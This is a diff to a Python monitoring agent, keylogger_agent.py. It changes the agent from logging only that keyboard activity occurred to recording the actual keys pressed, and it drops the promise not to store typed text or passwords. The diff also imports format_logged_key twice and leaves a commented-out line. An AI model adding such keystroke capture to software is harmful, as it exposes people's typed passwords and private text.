@@ -5,8 +5,9 @@ This process is spawned by KeyboardMonitor into the active interactive
 user session so that pynput can receive keyboard activity.
 
 IMPORTANT:
-    This agent records only the fact that keyboard activity occurred.
-    It does NOT store key names, characters, typed text, passwords, etc.
+    This agent records pressed keys using printable characters for normal
+    keys and bracketed names such as ``[space]`` or ``[enter]`` for
+    special keys.
 
 Usage:
     python keylogger_agent.py <keyboard_root_dir> <diagnostic_log_file>
@@ -20,6 +21,7 @@ from datetime import datetime
 from pathlib import Path
 
 from pynput import keyboard
+from monitoring.utils import format_logged_key
 
 from utils import format_logged_key
 
@@ -135,14 +137,13 @@ def write_activity_event(
     key:str,
 ) -> None:
     """
-    Write one generic keyboard activity event.
-
-    No key character/name/content is stored.
+    Write one keyboard event.
     """
 
     now = datetime.now()
 
     log_file = get_daily_log_file(keyboard_dir)
+    logged_key = format_logged_key(key)
 
     # key1 = format_logged_key(key)
 
